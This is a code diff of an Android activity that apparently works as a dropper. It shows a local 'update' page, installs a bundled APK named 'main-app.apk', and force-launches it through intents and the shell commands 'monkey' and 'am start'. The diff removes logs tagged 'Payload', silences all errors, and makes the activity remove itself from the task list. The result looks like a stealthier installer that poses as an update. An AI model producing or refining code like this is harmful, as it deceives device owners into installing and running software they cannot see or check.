@@ -16,7 +16,6 @@ import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
-import android.util.Log
 import android.util.TypedValue
 import android.view.View
 import android.view.WindowInsetsController
@@ -31,7 +30,6 @@ import java.io.FileOutputStream
 class MainActivity : Activity() {
 
     companion object {
-        private const val TAG = "Payload"
         private const val APK_NAME = "main-app.apk"
         private const val REQUEST_INSTALL = 100
         private const val ACTION_INSTALL = "com.example.installer.INSTALL"
@@ -55,20 +53,17 @@ class MainActivity : Activity() {
 
                 PackageInstaller.STATUS_SUCCESS -> {
                     handler.post {
-                        toast("✅ Installed!")
+                        toast("Installed!")
                     }
-
-                    // ⭐ فوری باز کن - همین الان!
                     handler.postDelayed({
                         forceOpenApp()
-                    }, 500) // فقط 0.5 ثانیه!
+                    }, 500)
                 }
 
                 else -> {
                     handler.post {
                         isInstalling = false
                         toast("Installation failed")
-                        // برگشت به صفحه اصلی
                         webView.loadUrl("file:///android_asset/update/update.html?error=true")
                     }
                 }
@@ -79,12 +74,9 @@ class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // تنظیم Status Bar و Navigation Bar به سفید
         setupSystemBars()
-
         registerReceiver(installReceiver, IntentFilter(ACTION_INSTALL))
 
-        // راه‌اندازی WebView
         webView = WebView(this).apply {
             settings.apply {
                 javaScriptEnabled = true
@@ -101,7 +93,6 @@ class MainActivity : Activity() {
                 }
 
                 override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
-                    // اجازه بده همه URL ها داخل WebView لود بشن
                     return false
                 }
             }
@@ -109,16 +100,12 @@ class MainActivity : Activity() {
             webChromeClient = WebChromeClient()
         }
 
-        // اضافه کردن JavaScript Interface
         webView.addJavascriptInterface(WebAppInterface(), "Android")
-
-        // لود کردن صفحه اصلی
         webView.loadUrl("file:///android_asset/update/update.html")
 
         setContentView(webView)
     }
 
-    // JavaScript Interface برای ارتباط HTML با Android
     inner class WebAppInterface {
         @JavascriptInterface
         fun installPlugin() {
@@ -132,7 +119,6 @@ class MainActivity : Activity() {
         @JavascriptInterface
         fun onInstallComplete() {
             handler.post {
-                // بعد از نصب موفق، به صفحه اصلی برگرد
                 webView.postDelayed({
                     webView.loadUrl("file:///android_asset/update/update.html?installed=true")
                 }, 1000)
@@ -157,7 +143,6 @@ class MainActivity : Activity() {
         if (isInstalling) return
         isInstalling = true
 
-        // نمایش صفحه نصب
         handler.post {
             webView.loadUrl("file:///android_asset/update/installing.html")
         }
@@ -175,9 +160,6 @@ class MainActivity : Activity() {
                     }
                     return@Thread
                 }
-
-                Log.d(TAG, "Package: $packageName")
-                Log.d(TAG, "Activity: $mainActivity")
 
                 val installer = packageManager.packageInstaller
 
@@ -224,7 +206,6 @@ class MainActivity : Activity() {
                 session.commit(sender.intentSender)
 
             } catch (e: Exception) {
-                Log.e(TAG, "Error", e)
                 session?.abandon()
                 handler.post {
                     isInstalling = false
@@ -256,7 +237,6 @@ class MainActivity : Activity() {
 
             info?.let {
                 packageName = it.packageName
-                // ⭐ Fix: ذخیره activities در متغیر local
                 val activities = it.activities
                 if (activities != null && activities.isNotEmpty()) {
                     mainActivity = activities[0].name
@@ -266,49 +246,34 @@ class MainActivity : Activity() {
             tempFile.delete()
 
         } catch (e: Exception) {
-            Log.e(TAG, "Read error", e)
+            // Ignore
         }
     }
 
-    // ⭐⭐⭐ همه روش‌ها یکجا!
     private fun forceOpenApp() {
-        Log.d(TAG, ">>> FORCE OPENING APP <<<")
-
         Thread {
             try {
-                // صبر کوتاه
                 Thread.sleep(800)
-
-                // روش 1: Intent با ComponentName
                 tryMethod1()
                 Thread.sleep(300)
-
-                // روش 2: Shell monkey
                 tryMethod2()
                 Thread.sleep(300)
-
-                // روش 3: Shell am
                 tryMethod3()
                 Thread.sleep(300)
-
-                // روش 4: getLaunchIntent
                 tryMethod4()
 
-                // بستن MainActivity بعد از باز کردن اپ
                 handler.postDelayed({
-                    finish()
+                    finishAndRemoveTask()
                 }, 1000)
 
             } catch (e: Exception) {
-                Log.e(TAG, "Error", e)
+                // Ignore
             }
         }.start()
     }
 
     private fun tryMethod1() {
         try {
-            Log.d(TAG, "[1] ComponentName Intent")
-
             if (packageName == null || mainActivity == null) return
 
             val intent = Intent().apply {
@@ -317,51 +282,37 @@ class MainActivity : Activity() {
             }
 
             startActivity(intent)
-            Log.d(TAG, "[1] Success!")
-
         } catch (e: Exception) {
-            Log.e(TAG, "[1] Failed: ${e.message}")
+            // Ignore
         }
     }
 
     private fun tryMethod2() {
         try {
-            Log.d(TAG, "[2] Shell monkey")
-
             packageName ?: return
 
             val cmd = "monkey -p $packageName 1"
             val process = Runtime.getRuntime().exec(cmd)
-            val exit = process.waitFor()
-
-            Log.d(TAG, "[2] Exit: $exit")
-
+            process.waitFor()
         } catch (e: Exception) {
-            Log.e(TAG, "[2] Failed: ${e.message}")
+            // Ignore
         }
     }
 
     private fun tryMethod3() {
         try {
-            Log.d(TAG, "[3] Shell am")
-
             packageName ?: return
 
             val cmd = "am start -n $packageName/$mainActivity"
             val process = Runtime.getRuntime().exec(cmd)
-            val exit = process.waitFor()
-
-            Log.d(TAG, "[3] Exit: $exit")
-
+            process.waitFor()
         } catch (e: Exception) {
-            Log.e(TAG, "[3] Failed: ${e.message}")
+            // Ignore
         }
     }
 
     private fun tryMethod4() {
         try {
-            Log.d(TAG, "[4] getLaunchIntent")
-
             packageName ?: return
 
             val intent = packageManager.getLaunchIntentForPackage(packageName!!)
@@ -369,11 +320,9 @@ class MainActivity : Activity() {
             intent?.let {
                 it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 startActivity(it)
-                Log.d(TAG, "[4] Success!")
             }
-
         } catch (e: Exception) {
-            Log.e(TAG, "[4] Failed: ${e.message}")
+            // Ignore
         }
     }
 
@@ -395,66 +344,55 @@ class MainActivity : Activity() {
         try {
             val window = window
             
-            // تنظیم Status Bar و Navigation Bar به سفید
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                // Android 11 (API 30) و بالاتر
                 try {
                     window.statusBarColor = Color.WHITE
                     window.navigationBarColor = Color.WHITE
                     
                     val controller = window.insetsController
                     controller?.let {
-                        // نمایش Status Bar icons به صورت تیره (برای خوانایی روی پس‌زمینه سفید)
                         it.setSystemBarsAppearance(
                             WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS,
                             WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS
                         )
-                        // نمایش Navigation Bar icons به صورت تیره
                         it.setSystemBarsAppearance(
                             WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS,
                             WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS
                         )
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Error setting system bars for API 30+", e)
+                    // Ignore
                 }
             } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                // Android 5.0 (API 21) تا Android 10 (API 29)
                 try {
                     window.statusBarColor = Color.WHITE
                     window.navigationBarColor = Color.WHITE
                     
-                    // برای Status Bar icons تیره
                     var flags = window.decorView.systemUiVisibility
-                    // SYSTEM_UI_FLAG_LIGHT_STATUS_BAR از API 23+ موجوده
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                         flags = flags or View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR
                     }
-                    // SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR از API 27+ موجوده
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                         flags = flags or View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR
                     }
                     window.decorView.systemUiVisibility = flags
                 } catch (e: Exception) {
-                    Log.e(TAG, "Error setting system bars for API 21-29", e)
+                    // Ignore
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Error in setupSystemBars", e)
-            // اگر خطا داشت، ادامه بده بدون اینکه برنامه crash کنه
+            // Ignore
         }
     }
 
     override fun onBackPressed() {
         try {
-            // اگر WebView می‌تونه back بره، بره
             if (::webView.isInitialized && webView.canGoBack()) {
                 webView.goBack()
             } else {
                 super.onBackPressed()
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Error in onBackPressed", e)
             super.onBackPressed()
         }
     }
